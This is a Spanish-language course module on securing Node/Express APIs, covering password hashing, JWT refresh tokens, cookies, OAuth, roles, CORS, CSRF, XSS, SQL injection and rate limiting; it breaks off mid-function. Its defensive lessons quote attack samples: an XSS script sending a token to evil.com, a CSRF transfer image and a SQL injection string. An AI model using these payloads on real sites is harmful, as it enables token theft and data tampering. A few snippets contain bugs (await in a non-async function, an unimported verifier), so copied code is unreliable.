# Módulo 14: Autenticación y Seguridad

## Objetivos de aprendizaje

Al finalizar este módulo, el estudiante será capaz de:

- Implementar login y registro robustos con hashing y tokens.
- Manejar JWT con access y refresh tokens.
- Configurar cookies seguras (HttpOnly, Secure, SameSite).
- Integrar OAuth 2.0 con proveedores externos.
- Aplicar autorización por roles y permisos.
- Configurar CORS correctamente.
- Mitigar CSRF, XSS y SQL Injection.
- Implementar rate limiting contra abuso.

---

## 1. Login (Inicio de sesión)

El proceso de **verificar la identidad** de un usuario contra credenciales (password, passkey, magic link, etc.).

### Flujo tradicional (password + JWT)

```
1. Usuario envía email + password
2. Server valida formato, busca usuario, compara hash
3. Si ok, genera tokens (access + refresh)
4. Devuelve access en JSON, refresh en cookie HttpOnly
```

### Endpoint básico

```js
// POST /api/auth/login
async function login(req, res) {
  const { email, password } = req.body;

  const user = await User.findOne({ where: { email } });
  if (!user) return res.status(401).json({ error: "Credenciales inválidas" });

  const ok = await bcrypt.compare(password, user.passwordHash);
  if (!ok) return res.status(401).json({ error: "Credenciales inválidas" });

  const payload = { sub: user.id, role: user.role };
  const accessToken  = signAccess(payload);
  const refreshToken = signRefresh({ sub: user.id });

  res
    .cookie("refreshToken", refreshToken, cookieOptions())
    .json({
      accessToken,
      user: publicUser(user),
    });
}
```

### Exponer solo lo público

```js
function publicUser(u) {
  return { id: u.id, email: u.email, name: u.name, role: u.role };
}
```

### Defensa contra timing attacks

`bcrypt.compare` ya es constante, pero `findOne` + bcrypt debe ejecutarse incluso si el usuario no existe (para evitar filtración por tiempo).

```js
async function authenticate(email, password) {
  const user = await User.findOne({ where: { email } });
  const fakeHash = "$2b$12$..."; // bcrypt hash de algo dummy

  const valid = await bcrypt.compare(password, user?.passwordHash || fakeHash);
  if (!user || !valid) throw new Error("Invalid");
  return user;
}
```

### Validación previa

```js
import { z } from "zod";

const LoginSchema = z.object({
  email: z.string().email(),
  password: z.string().min(1),
});
```

### Actividad práctica

- Implementa login con verificación de email y password hasheado, devolviendo access token y refresh cookie.

---

## 2. Registro

```js
const RegisterSchema = z.object({
  email: z.string().email(),
  password: z.string().min(8),
  name: z.string().min(2).max(80),
});

async function register(req, res) {
  const data = RegisterSchema.parse(req.body);

  const exists = await User.findOne({ where: { email: data.email } });
  if (exists) return res.status(409).json({ error: "Email ya registrado" });

  const passwordHash = await bcrypt.hash(data.password, 12);
  const user = await User.create({
    email: data.email,
    name: data.name,
    passwordHash,
  });

  res.status(201).json({ user: publicUser(user) });
}
```

### Política de contraseñas

- Mínimo 8 caracteres (preferible 12).
- Al menos 1 mayúscula, 1 minúscula, 1 número.
- Verificación contra lista de contraseñas filtradas (HaveIBeenPwned).
- Hashing con **bcrypt 12+** o **argon2id**.

```js
import argon2 from "argon2";

const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 19456,
  timeCost: 2,
  parallelism: 1,
});

const ok = await argon2.verify(hash, password);
```

### Verificación de email

```js
const token = crypto.randomBytes(32).toString("hex");
await EmailVerification.create({ userId: user.id, token, expiresAt: ... });

await mailer.send(email, "Verifica tu cuenta", `${BASE_URL}/verify?token=${token}`);
```

```js
app.get("/verify", async (req, res) => {
  const { token } = req.query;
  const v = await EmailVerification.findOne({ where: { token, used: false } });
  if (!v || v.expiresAt < new Date()) return res.status(400).send("Inválido");
  await User.update({ verified: true }, { where: { id: v.userId } });
  await v.update({ used: true });
  res.send("Cuenta verificada");
});
```

### Actividad práctica

- Implementa registro con verificación por email y validación fuerte de contraseña.

---

## 3. Hashing de contraseñas

Nunca almacenar passwords en texto plano. Usar funciones de hashing especializadas:

- **bcrypt**: lento, salted, popular.
- **argon2**: ganador del Password Hashing Competition.
- **scrypt**: basado en memoria.
- **PBKDF2**: NIST-approved.

### bcrypt

```bash
npm install bcrypt
```

```js
import bcrypt from "bcrypt";

// Hashear
const saltRounds = 12;
const passwordHash = await bcrypt.hash("secretpassword", saltRounds);

// Verificar
const ok = await bcrypt.compare("secretpassword", passwordHash);
```

### argon2

```bash
npm install argon2
```

```js
import argon2 from "argon2";

const hash = await argon2.hash("secretpassword");
const ok = await argon2.verify(hash, "secretpassword");
```

### Migración de algoritmos

Detectar el algoritmo y re-hashear en login:

```js
async function login(email, password) {
  const user = ...;
  if (user.hash.startsWith("$2b$")) {
    if (!await bcrypt.compare(password, user.hash)) throw "invalid";
    // rehash con argon2id
    user.hash = await argon2.hash(password);
    await user.save();
  } else {
    if (!await argon2.verify(user.hash, password)) throw "invalid";
  }
}
```

### Buenas prácticas

- **Nunca** loguees passwords o hashes.
- **Nunca** uses MD5/SHA1 para passwords.
- Usa salts automáticos (bcrypt, argon2 ya lo hacen).
- `pepper` opcional: clave servidor + hash = hash final.
- Implementa cambio de contraseña con re-autenticación.

### Actividad práctica

- Migra de bcrypt a argon2id manteniendo compat con hashes viejos.

---

## 4. JWT (recordatorio)

Ver Módulo 8. Aquí añadimos consideraciones de seguridad en el backend.

### Configuración segura

```js
import jwt from "jsonwebtoken";

const SECRET = process.env.JWT_SECRET;          // 256+ bits random
const REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;

const ACCESS_TTL  = "15m";
const REFRESH_TTL = "7d";
```

Generar secretos:

```bash
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
```

### Claims útiles

```js
signAccess({
  sub: user.id,
  role: user.role,
  email: user.email,
  iat: Math.floor(Date.now() / 1000),
  iss: "mi-api",
  aud: "users",
});
```

### Verificación con tipado

```js
function verifyAccess(token) {
  return jwt.verify(token, SECRET, {
    algorithms: ["HS256"],
    issuer: "mi-api",
    audience: "users",
  });
}
```

### Logout / blacklist

- Estrategia "sliding" sin blacklist: rotar refresh.
- Estrategia con blacklist en Redis:

```js
async function logout(token) {
  await redis.set(`bl:${token}`, 1, "EX", segundosRestantes);
}

function verifyAccess(token) {
  if (await redis.get(`bl:${token}`)) throw new Error("Revoked");
  return jwt.verify(token, SECRET);
}
```

### Revocación por usuario

```js
// Cambiar password o detección de robo → subir versión
await User.update({ tokenVersion: user.tokenVersion + 1 }, { where: { id } });

// En el token
signAccess({ sub: id, ver: user.tokenVersion });

// Validar
if (req.user.ver !== user.tokenVersion) return res.status(401);
```

### Actividad práctica

- Añade una blacklist con Redis para logout y rotación de tokens.

---

## 5. Refresh Tokens

Permiten **renovar el access token** sin que el usuario vuelva a iniciar sesión.

### Flujo

```
client                servidor
 │  POST /login       │
 │───────────────────▶│ access (15min) + refresh cookie (7d)
 │◀─────────────────│
 │  GET /api/users     │ access expira...
 │───────────────────▶│ 401
 │  POST /auth/refresh │
 │───────────────────▶│ nuevo access
```

### Implementación

```js
function signRefresh({ sub, jti }) {
  return jwt.sign({ sub, jti }, REFRESH_SECRET, { expiresIn: REFRESH_TTL });
}

async function refresh(req, res) {
  const token = req.cookies.refreshToken;
  if (!token) return res.status(401).json({ error: "Sin refresh token" });

  let data;
  try { data = verifyRefresh(token); }
  catch { return res.status(401).json({ error: "Refresh inválido" }); }

  // Opcional: rotar refresh en cada uso (más seguro)
  await RefreshToken.update({ used: true }, { where: { jti: data.jti } });

  const user = await User.findByPk(data.sub);
  if (!user) return res.status(401).json({ error: "Usuario no existe" });

  const newJti   = crypto.randomUUID();
  const newRefresh = signRefresh({ sub: user.id, jti: newJti });
  const newAccess  = signAccess({ sub: user.id, role: user.role });

  await RefreshToken.create({ jti: newJti, userId: user.id, expiresAt: new Date(Date.now() + 7*24*3600*1000) });

  res
    .cookie("refreshToken", newRefresh, cookieOptions())
    .json({ accessToken: newAccess });
}
```

### Detección de reuso

Si un refresh reusado llega cuando ya estaba usado, **revocar todos los tokens** de ese usuario.

### Rotación

```js
const cookieOptions = () => ({
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax",
  path: "/api/auth/refresh", // limitar el alcance
  maxAge: 7 * 24 * 60 * 60 * 1000,
});
```

### Persistencia para revocación

```sql
CREATE TABLE refresh_tokens (
  id          SERIAL PRIMARY KEY,
  jti         UUID UNIQUE NOT NULL,
  user_id     INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  used        BOOLEAN DEFAULT FALSE,
  expires_at  TIMESTAMP NOT NULL,
  created_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX idx_refresh_user ON refresh_tokens(user_id);
```

### Actividad práctica

- Implementa refresh token con rotación y detección de reuso.

---

## 6. Cookies HttpOnly

Las cookies son la forma más segura de entregar refresh tokens a la SPA (mitigan XSS).

### Flags de seguridad

```js
const cookieOptions = () => ({
  httpOnly: true,                                  // no accesible desde JS
  secure: process.env.NODE_ENV === "production",   // solo HTTPS
  sameSite: "lax",                                  // o "strict" o "none"
  path: "/api/auth",                                // limitar path
  maxAge: 7 * 24 * 60 * 60 * 1000,                  // 7 días
});
```

### Significado de flags

| Flag       | Significado                                  |
| ---------- | -------------------------------------------- |
| `HttpOnly` | Bloquea acceso desde JavaScript (`document.cookie`). |
| `Secure`   | Solo se envía sobre HTTPS.                    |
| `SameSite` | Controla envío en navegación cross-site (`Strict`, `Lax`, `None`). |
| `Domain`   | Dominio al que aplica.                        |
| `Path`     | Restringe la ruta.                            |
| `Max-Age` / `Expires` | Control de expiración.              |

### Leer cookies en Express

```bash
npm install cookie-parser
```

```js
import cookieParser from "cookie-parser";
app.use(cookieParser());

req.cookies.refreshToken;
```

### Frontend

```js
// El navegador envía la cookie automáticamente si es SameSite=Lax
fetch("/api/auth/refresh", {
  method: "POST",
  credentials: "include",  // ⚠️ necesario
});
```

### Flujo recomendado

- **AccessToken**: memoria (JS) o `sessionStorage`. Nunca localStorage.
- **RefreshToken**: cookie HttpOnly Secure.

### Alternativa: refresh en header

```js
// Si no quieres cookies, el cliente envía refresh en Authorization
fetch("/api/auth/refresh", {
  method: "POST",
  headers: { "X-Refresh-Token": refresh },
});
```

### Actividad práctica

- Configura cookies con todos los flags para refreshToken y verifica que JS no pueda leerlas.

---

## 7. OAuth 2.0

Permite que los usuarios inicien sesión con un **proveedor externo** (Google, GitHub, Facebook, etc.) sin compartir sus passwords contigo.

### Roles

- **Resource Owner**: el usuario.
- **Client**: tu app.
- **Authorization Server**: proveedor (Google).
- **Resource Server**: la API del proveedor.

### Flujo Authorization Code (recomendado para server-side)

```
1. Cliente redirige a /authorize con client_id, redirect_uri, scope, state
2. Usuario autoriza en el proveedor
3. Proveedor redirige a redirect_uri con code
4. Server intercambia code por access_token (con client_secret)
5. Server usa access_token contra la API del proveedor
```

### Con Passport.js

```bash
npm install passport passport-google-oauth20
```

```js
import passport from "passport";
import { Strategy as GoogleStrategy } from "passport-google-oauth20";

passport.use(new GoogleStrategy({
  clientID: process.env.GOOGLE_CLIENT_ID,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET,
  callbackURL: "/api/auth/google/callback",
}, async (accessToken, refreshToken, profile, done) => {
  let user = await User.findOne({ where: { googleId: profile.id } });
  if (!user) {
    user = await User.create({
      email: profile.emails[0].value,
      name: profile.displayName,
      googleId: profile.id,
    });
  }
  done(null, user);
}));
```

```js
app.get("/api/auth/google",        passport.authenticate("google", { scope: ["profile", "email"] }));
app.get("/api/auth/google/callback",
  passport.authenticate("google", { session: false }),
  (req, res) => {
    const accessToken  = signAccess({ sub: req.user.id });
    const refreshToken = signRefresh({ sub: req.user.id });
    res.cookie("refreshToken", refreshToken, cookieOptions())
       .redirect(`${process.env.FRONTEND_URL}/oauth-callback#access_token=${accessToken}`);
  }
);
```

### OpenID Connect

```js
passport.use(new GoogleStrategy({
  clientID, clientSecret, callbackURL, scope: ["openid", "email", "profile"]
}, ...));
```

### GitHub, Facebook, Discord

Parecido, con sus respectivas URIs y scopes.

### OAuth 2.0 con PKCE (para SPAs / mobile)

```js
// 1. generar code_verifier y code_challenge
const verifier = base64url(crypto.getRandomValues(new Uint8Array(32)));
const challenge = base64url(await sha256(verifier));

// 2. redirect a /authorize con code_challenge
// 3. intercambiar code + code_verifier por token (sin client_secret)
```

### Actividad práctica

- Configura login con Google. Al obtener el perfil, crea el usuario si no existe y devuelve tokens propios.

---

## 8. Roles y Permisos

Una vez autenticado, **autorización** controla qué puede hacer.

### RBAC (Role-Based Access Control)

Roles son etiquetas agregadas al usuario (`admin`, `editor`, `viewer`). Permisos se asignan por rol.

### Middleware de rol

```js
export const requireRole = (...roles) => (req, res, next) => {
  if (!req.user) return res.status(401).json({ error: "Sin autenticación" });
  if (!roles.includes(req.user.role)) return res.status(403).json({ error: "Sin permisos" });
  next();
};

router.get("/admin/users", requireRole("admin"), listUsers);
router.post("/admin/users", requireRole("admin"), createUser);
```

### Matriz rol → permisos

```js
const PERMISSIONS = {
  admin: ["users.read", "users.write", "products.read", "products.write"],
  editor: ["products.read", "products.write"],
  viewer: ["products.read"],
};
```

### Middleware por permiso

```js
const requirePerm = (...required) => (req, res, next) => {
  const role = req.user?.role;
  const perms = PERMISSIONS[role] || [];
  if (!required.every(p => perms.includes(p))) {
    return res.status(403).json({ error: "Permisos insuficientes" });
  }
  next();
};

router.post("/products", requirePerm("products.write"), createProduct);
```

### ABAC (Attribute-Based Access Control)

Más granular, evalúa atributos del usuario, recurso, entorno.

```js
function canEdit(user, resource) {
  if (user.role === "admin") return true;
  if (resource.authorId === user.id) return true;
  return false;
}
```

### Permisos por recurso (ownership)

```js
async function updatePost(req, res) {
  const post = await Post.findByPk(req.params.id);
  if (!post) return res.status(404).json({ error: "No existe" });
  if (post.userId !== req.user.sub && req.user.role !== "admin") {
    return res.status(403).json({ error: "No es tu post" });
  }
  await post.update(req.body);
  res.json(post);
}
```

### Multi-tenancy

```js
function scopeByTenant(query, req) {
  if (req.user.role !== "admin") {
    query.where = { ...query.where, tenantId: req.user.tenantId };
  }
  return query;
}
```

### Actividad práctica

- Implementa RBAC con matriz de permisos y un endpoint admin protegido.

---

## 9. CORS (Cross-Origin Resource Sharing)

Permite o restringe que un frontend en otro dominio consuma tu API.

### Origen y `same-origin policy`

```
Frontend: https://app.com
API:      https://api.app.com
```

Si no configuras CORS, el navegador bloquea.

### `cors` middleware

```bash
npm install cors
```

```js
import cors from "cors";

app.use(cors({
  origin: ["https://app.com", "https://admin.app.com"],
  credentials: true,                 // si envías cookies
  methods: ["GET", "POST", "PUT", "PATCH", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization"],
  exposedHeaders: ["X-Total-Count"],
  maxAge: 600,                       // cache de preflight
}));
```

### Preflight

```http
OPTIONS /api/products HTTP/1.1
Origin: https://app.com
Access-Control-Request-Method: POST
```

Respuesta esperada:

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 600
```

### `credentials: "include"`

Frontend:

```js
fetch("https://api.app.com/products", { credentials: "include" });
```

Backend:

```js
res.header("Access-Control-Allow-Credentials", "true");
res.header("Access-Control-Allow-Origin", "https://app.com");
// ⚠️ No '*' si se usan credenciales
```

### Errores comunes

- `Access-Control-Allow-Origin: *` con credenciales → inválido.
- Olvidar `OPTIONS` (preflight falla).
- No permitir header `Authorization` en `allowedHeaders`.

### Solo API sin cookies

Si la API no usa cookies (auth por header), CORS es más simple:

```js
app.use(cors({ origin: "*" }));
```

### Actividad práctica

- Configura CORS para un frontend específico con `credentials: true` y permitir `Authorization`.

---

## 10. CSRF (Cross-Site Request Forgery)

Un atacante hace que la víctima (con sesión activa) ejecute acciones no deseadas en tu app.

### Ejemplo

- Usuario autenticado en `banco.com`.
- Visita página atacante con `<img src="banco.com/transfer?to=atacante&amount=1000">`.
- El navegador envía automáticamente la cookie.

### Mitigaciones

#### 1. Cookies `SameSite`

```js
res.cookie("session", token, { sameSite: "strict" }); // bloquea en cross-site
```

#### 2. CSRF Token (doble submit)

```js
import csrf from "csurf";
app.use(csrf({ cookie: true }));
```

```html
<form>
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
</form>
```

#### 3. Headers personalizados

Frontend envía `X-CSRF-Token` que el atacante no puede crear desde otro origen (sin CORS).

```js
app.use((req, res, next) => {
  if (["POST", "PUT", "PATCH", "DELETE"].includes(req.method)) {
    const header = req.get("X-CSRF-Token");
    const cookie = req.cookies.csrf;
    if (!header || header !== cookie) {
      return res.status(403).json({ error: "CSRF inválido" });
    }
  }
  next();
});
```

#### 4. Verificar `Origin` y `Referer`

```js
app.use((req, res, next) => {
  const origin = req.get("Origin") || req.get("Referer");
  if (!origin?.startsWith(process.env.FRONTEND_URL)) {
    return res.status(403).json({ error: "Origen inválido" });
  }
  next();
});
```

#### 5. Patrón "Synchronizer Token"

- Server genera token único y lo guarda en sesión.
- Lo inyecta en formularios.
- Cliente lo envía de vuelta y el server lo valida.

### ¿Cuándo es necesario?

| Auth               | CSRF necesario |
| ------------------ | --------------- |
| Cookie de sesión   | **Sí**          |
| Cookie HttpOnly + SameSite=Lax o Strict | Generalmente no  |
| Bearer token en header | No (el atacante no puede leer headers) |

### Actividad práctica

- Implementa CSRF token en una app con login por cookies.

---

## 11. XSS (Cross-Site Scripting)

El atacante **inyecta JavaScript** en tu página para robar datos (sesiones, tokens) o actuar en nombre del usuario.

### Tipos

- **Stored**: el script queda guardado (comentarios, post).
- **Reflected**: viene de la URL (query params).
- **DOM-based**: el JS de la página interpreta datos sin sanitizar.

### Ejemplo

```html
<!-- Atacante -->
<form action="https://app.com/comment">
  <input name="text" value="<script>fetch('evil.com?t=' + localStorage.token)</script>">
</form>
```

Si la app renderiza ese comentario sin sanitizar, ejecuta el script.

### Mitigaciones

#### 1. Escapar al renderizar

React lo hace por defecto (no interpreta `dangerouslySetInnerHTML`).

#### 2. Sanitizar input del usuario

```bash
npm install dompurify jsdom
```

```js
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);

const clean = DOMPurify.sanitize(userInput);
```

#### 3. Validar con whitelist

- Solo permitir tags específicos (`b, i, a, p, br`).
- `a` solo con `href` controlado.
- Atributos limitados.

#### 4. CSP (Content-Security-Policy)

```js
app.use(helmet());

app.use(helmet.contentSecurityPolicy({
  useDefaults: true,
  directives: {
    "default-src": ["'self'"],
    "script-src": ["'self'"],
    "img-src": ["'self'", "https:"],
    "object-src": ["'none'"],
    "frame-ancestors": ["'none'"],
    "upgrade-insecure-requests": [],
  },
}));
```

#### 5. Cabeceras

- `X-Content-Type-Options: nosniff`.
- `X-Frame-Options: DENY`.
- `Referrer-Policy: strict-origin-when-cross-origin`.

#### 6. HttpOnly + SameSite

```js
res.cookie("session", sid, { httpOnly: true, sameSite: "strict" });
```

#### 7. Trusted Types

```http
Content-Security-Policy: require-trusted-types-for 'script'
```

### Actividad práctica

- Sanitiza entradas HTML con DOMPurify antes de almacenarlas y configura una CSP estricta.

---

## 12. SQL Injection

El atacante **inyecta SQL** malicioso en inputs, ejecutando consultas no previstas.

### Ejemplo

```js
// ❌ vulnerable
const query = `SELECT * FROM users WHERE email = '${email}'`;
// email = "a@x.com' OR '1'='1"
```

### Mitigaciones

#### Prepared statements / parámetros

```js
// ✅ Sequelize
const user = await User.findOne({ where: { email } });

// ✅ pg
const { rows } = await pool.query("SELECT * FROM users WHERE email = $1", [email]);
```

#### ORM (Sequelize, Prisma)

ORMs modernos escapan parámetros automáticamente. **Pero**:

- Concatenación cruda en queries raw sigue siendo peligrosa.
- No confíes solo en el ORM.

#### Validar y tipar input

- Conversión explícita: `parseInt`, `Number()`.
- Whitelist para valores permitidos (enum).

```js
const allowed = ["user", "admin"];
if (!allowed.includes(role)) throw new Error("Rol inválido");
```

#### Escapar entradas dinámicas

Si por alguna razón necesitas construir SQL dinámico:

```js
// NUNCA interpolar strings
// Usa parámetros o sanitización específica del motor
const table = "users";
// Whitelist
const allowed = ["users", "posts"];
if (!allowed.includes(table)) throw new Error("invalid");

await pool.query(`SELECT * FROM ${table} WHERE id = $1`, [id]);
```

#### Principio de menor privilegio

- DB user de la app no debe ser `root`.
- Permisos limitados a las tablas necesarias.

### Actividad práctica

- Toma un endpoint vulnerable a SQLi y reescríbelo con prepared statements.

---

## 13. Rate Limiting

Limita la cantidad de peticiones que un cliente puede hacer para evitar abuso.

### `express-rate-limit`

```bash
npm install express-rate-limit
```

### Limitador global

```js
import rateLimit from "express-rate-limit";

const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 min
  max: 200,
  standardHeaders: true,  // RateLimit-*
  legacyHeaders: false,
  message: { error: "Demasiadas peticiones" },
});

app.use(globalLimiter);
```

### Limitador para login

```js
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: { error: "Demasiados intentos. Intenta en 15 min." },
});

router.post("/login", loginLimiter, login);
```

### Por IP y por usuario

```js
const perUserLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 30,
  keyGenerator: (req) => req.user?.id || req.ip,
});
```

### Almacenamiento (Redis) para clusters

```bash
npm install rate-limit-redis ioredis
```

```js
import RedisStore from "rate-limit-redis";
import Redis from "ioredis";

const redis = new Redis();

const limiter = rateLimit({
  store: new RedisStore({
    sendCommand: (...args) => redis.call(...args),
  }),
  windowMs: 15 * 60 * 1000,
  max: 100,
});
```

### Backoff exponencial

```js
const handler = (req, res, next, options) => {
  const ms = Math.round(options.windowMs / 2);
  res.header("Retry-After", ms / 1000);
  res.status(options.statusCode).json({ error: options.message });
};

rateLimit({ handler });
```

### Slow-down

```bash
npm install express-slow-down
```

Reduce velocidad en lugar de bloquear:

```js
const slowDown = require("express-slow-down");

const speedLimiter = slowDown({
  windowMs: 15 * 60 * 1000,
  delayAfter: 50,
  delayMs: (hits) => hits * 100,
});

app.use("/api", speedLimiter);
```

### Honeypot

Formularios ocultos. Si se rellenan, es un bot.

### Captcha

```bash
npm install express-recaptcha
```

```js
app.post("/login", recaptcha.middleware.verify, login);
```

### Actividad práctica

- Configura rate limiting diferenciado para `/api/auth/login`, `/api/auth/register`, y un limiter global con Redis.

---

## Cabeceras de seguridad con `helmet`

```js
import helmet from "helmet";

app.use(helmet());  // aplica todas las cabeceras seguras

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      "default-src": ["'self'"],
      "script-src": ["'self'"],
      "style-src": ["'self'", "'unsafe-inline'"],
      "img-src": ["'self'", "data:", "https:"],
      "object-src": ["'none'"],
      "frame-ancestors": ["'none'"],
    },
  })
);
```

Cabeceras aplicadas:
- `X-DNS-Prefetch-Control: off`.
- `X-Frame-Options: SAMEORIGIN`.
- `X-Content-Type-Options: nosniff`.
- `Strict-Transport-Security: max-age=15552000; includeSubDomains`.
- `X-XSS-Protection: 0` (CSP lo reemplaza).
- `Referrer-Policy: no-referrer`.

### HSTS (HTTPS estricto)

```js
app.use(helmet.hsts({
  maxAge: 31536000,
  includeSubDomains: true,
  preload: true,
}));
```

---

## Logging y monitorización

### `pino`

```bash
npm install pino
```

```js
import pino from "pino";
import pinoHttp from "pino-http";

export const logger = pino({ level: process.env.LOG_LEVEL || "info" });

app.use(pinoHttp({ logger }));
```

### Sentry para errores

```bash
npm install @sentry/node
```

```js
import * as Sentry from "@sentry/node";

Sentry.init({ dsn: process.env.SENTRY_DSN, environment: process.env.NODE_ENV });

app.use(Sentry.Handlers.requestHandler());
app.use(Sentry.Handlers.tracingHandler());

app.use(Sentry.Handlers.errorHandler());
```

### Buenas prácticas

- **NO loguear**: passwords, tokens, tarjetas, datos personales sensibles.
- **Sanitizar** antes de enviar a servicios externos.
- Logs estructurados (JSON) con `requestId` por correlación.
- Distinguir errores esperados vs inesperados.

---

## Auditoría de seguridad

### Checklist OWASP Top 10 (API)

1. **Broken Object Level Authorization (BOLA)**: validar que el usuario sea dueño del recurso.
2. **Broken Authentication**: tokens robustos, no JWTs sin firma.
3. **Broken Object Property Level Authorization**: filtrar campos según rol.
4. **Unrestricted Resource Consumption**: rate limit + paginación.
5. **Broken Function Level Authorization**: middleware por rol.
6. **Server-Side Request Forgery**: validar URLs salientes.
7. **Security Misconfiguration**: helmet, CORS, .env fuera del repo.
8. **Injection**: prepared statements, validación.
9. **Improper Assets Management**: versionado, deprecation.
10. **Insufficient Logging & Monitoring**: Sentry, logs, alertas.

### Herramientas

- **Snyk**, **npm audit**: vulnerabilidades en dependencias.
- **OWASP ZAP**: scanner activo.
- **Burp Suite**: análisis manual.
- **eslint-plugin-security**: patrones inseguros.

### Actividad práctica

- Aplica OWASP API Top 10 a tu proyecto y corrige las brechas.

---

## Proyecto integrador (módulo)

API con autenticación robusta, autorización por roles, contraseñas hasheadas, JWT, refresh, cookies seguras, OAuth, CORS, rate limiting, cabeceras, validación y logging.

### Variables de entorno

```env
# .env
NODE_ENV=production
PORT=4000

DATABASE_URL=postgres://user:pass@localhost:5432/app

JWT_SECRET=cambiar-en-produccion-valor-aleatorio-de-256-bits
JWT_REFRESH_SECRET=otro-secreto-256-bits

GOOGLE_CLIENT_ID=...
GOOGLE_CLIENT_SECRET=...

FRONTEND_URL=https://app.com

REDIS_URL=redis://localhost:6379
```

### Endpoints finales

| Método | Ruta                              | Auth        | Descripción                       |
| ------ | --------------------------------- | ----------- | --------------------------------- |
| POST   | /api/auth/register                | No          | Registrar                          |
| POST   | /api/auth/login                   | No          | Login (rate limited)               |
| POST   | /api/auth/refresh                 | Cookie      | Refresh                            |
| POST   | /api/auth/logout                  | Cookie      | Logout                             |
| GET    | /api/auth/google                  | No          | Inicio OAuth Google                |
| GET    | /api/auth/google/callback         | No          | Callback                           |
| GET    | /api/auth/me                      | Bearer      | Perfil                             |
| GET    | /api/users                        | admin       | Listar usuarios                    |
| PATCH  | /api/users/:id/role               | admin       | Cambiar rol                        |
| POST   | /api/products                     | editor+     | Crear producto                     |
| GET    | /api/products                     | Cualquiera  | Listar productos                   |
| DELETE | /api/products/:id                 | owner/admin | Eliminar propio o cualquier        |

### `app.js`

```js
import express from "express";
import helmet from "helmet";
import cors from "cors";
import cookieParser from "cookie-parser";
import pinoHttp from "pino-http";
import rateLimit from "express-rate-limit";

import logger from "./config/logger.js";
import { authRouter } from "./routes/auth.routes.js";
import { usersRouter } from "./routes/users.routes.js";
import { productsRouter } from "./routes/products.routes.js";
import { errorHandler } from "./middlewares/error.js";

const app = express();

app.set("trust proxy", 1); // si estás detrás de nginx/load balancer

app.use(helmet());
app.use(cors({
  origin: process.env.FRONTEND_URL,
  credentials: true,
  methods: ["GET", "POST", "PUT", "PATCH", "DELETE"],
  allowedHeaders: ["Content-Type", "Authorization", "X-CSRF-Token"],
  exposedHeaders: ["X-Total-Count"],
}));

app.use(express.json({ limit: "100kb" }));
app.use(cookieParser());
app.use(pinoHttp({ logger }));

// Rate limit global
app.use("/api", rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 200,
}));

// Rutas
app.get("/api/health", (req, res) => res.json({ ok: true }));
app.use("/api/auth", authRouter);
app.use("/api/users", usersRouter);
app.use("/api/products", productsRouter);

// Errores
app.use(errorHandler);

export default app;
```

### `routes/auth.routes.js`

```js
import { Router } from "express";
import passport from "passport";
import rateLimit from "express-rate-limit";
import * as c from "../controllers/auth.controller.js";

const router = Router();

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: { error: "Demasiados intentos" },
});

router.post("/register", c.register);
router.post("/login",    loginLimiter, c.login);
router.post("/refresh",  c.refresh);
router.post("/logout",   c.logout);

router.get("/google",        passport.authenticate("google", { scope: ["profile", "email"] }));
router.get("/google/callback",
  passport.authenticate("google", { session: false }),
  c.googleCallback
);

router.get("/me", c.authMiddleware, c.me);

export default router;
```

### `controllers/auth.controller.js`

```js
import bcrypt from "bcrypt";
import { z } from "zod";
import { User } from "../models/index.js";
import { signAccess, signRefresh, verifyRefresh } from "../utils/jwt.js";

const cookieOptions = () => ({
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "lax",
  path: "/api/auth",
  maxAge: 7 * 24 * 60 * 60 * 1000,
});

export async function register(req, res) {
  const { email, password, name } = z.object({
    email: z.string().email(),
    password: z.string().min(8),
    name: z.string().min(2),
  }).parse(req.body);

  const exists = await User.findOne({ where: { email } });
  if (exists) return res.status(409).json({ error: "Ya registrado" });

  const passwordHash = await bcrypt.hash(password, 12);
  const user = await User.create({ email, name, passwordHash, role: "user" });
  res.status(201).json({ id: user.id, email: user.email, name: user.name });
}

export async function login(req, res) {
  const { email, password } = z.object({
    email: z.string().email(),
    password: z.string().min(1),
  }).parse(req.body);

  const user = await User.findOne({ where: { email } });
  const valid = user && (await bcrypt.compare(password, user.passwordHash));
  if (!valid) return res.status(401).json({ error: "Credenciales inválidas" });

  const accessToken  = signAccess({ sub: user.id, role: user.role });
  const refreshToken = signRefresh({ sub: user.id });

  res
    .cookie("refreshToken", refreshToken, cookieOptions())
    .json({
      accessToken,
      user: { id: user.id, email: user.email, name: user.name, role: user.role },
    });
}

export async function refresh(req, res) {
  const token = req.cookies.refreshToken;
  if (!token) return res.status(401).json({ error: "No refresh" });
  try {
    const { sub } = verifyRefresh(token);
    const user = await User.findByPk(sub);
    if (!user) return res.status(401).json({ error: "No user" });
    res.json({ accessToken: signAccess({ sub: user.id, role: user.role }) });
  } catch {
    res.status(401).json({ error: "Invalid refresh" });
  }
}

export async function logout(req, res) {
  res.clearCookie("refreshToken", { path: "/api/auth" }).json({ ok: true });
}

export async function me(req, res) {
  const user = await User.findByPk(req.user.sub, {
    attributes: ["id", "email", "name", "role", "createdAt"],
  });
  res.json(user);
}

export const authMiddleware = (req, res, next) => {
  const header = req.headers.authorization;
  if (!header?.startsWith("Bearer ")) return res.status(401).json({ error: "No auth" });
  try {
    req.user = verifyAccess(header.slice(7));
    next();
  } catch {
    res.status(401).json({ error: "Invalid token" });
  }
};

export async function googleCallback(req, res) {
